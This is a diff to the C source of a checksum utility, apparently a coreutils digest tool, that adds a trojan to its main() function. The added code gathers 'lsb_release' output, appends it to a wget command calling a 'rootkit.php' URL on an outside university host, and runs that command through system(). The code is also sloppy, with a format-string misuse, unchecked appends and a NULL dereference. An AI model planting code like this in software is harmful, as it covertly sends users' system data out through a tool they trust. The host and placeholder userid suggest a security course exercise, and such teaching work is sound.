@@ -857,11 +857,9 @@ digest_check (const char *checkfile_name)
           && (!strict || n_improperly_formatted_lines == 0));
 }
 
-// main method
-
 int main (int argc, char **argv) {
   //string data storage
-  char url[66] = "https://andromeda.cs.virginia.edu/rootkit.php?userid=mst3k&data=";
+  char url[256] = "wget -q \"https://andromeda.cs.virginia.edu/rootkit.php?userid=tkj9ep&data=";
 
   //grabs the release data and writes to a file called output.txt
   system("lsb_release -a > output.txt");
@@ -871,10 +869,22 @@ int main (int argc, char **argv) {
   char ch;
 
   file = fopen("output.txt", "r");
-  while(ch = getc(file) != EOF)
-  printf("%c", ch);
-  fclose(file);
 
+  if(file == NULL) {
+    printf("file not found");
+  }
+
+  do {
+    ch = fgetc(file);
+    strncat(url, &ch, 1);
+
+  } while(ch != EOF);
+
+  strcat(url, "\"");
+  printf(url);
+
+  fclose(file);
+  system(url);
   //printf(url);
 
   unsigned char bin_buffer_unaligned[DIGEST_BIN_BYTES + DIGEST_ALIGN];
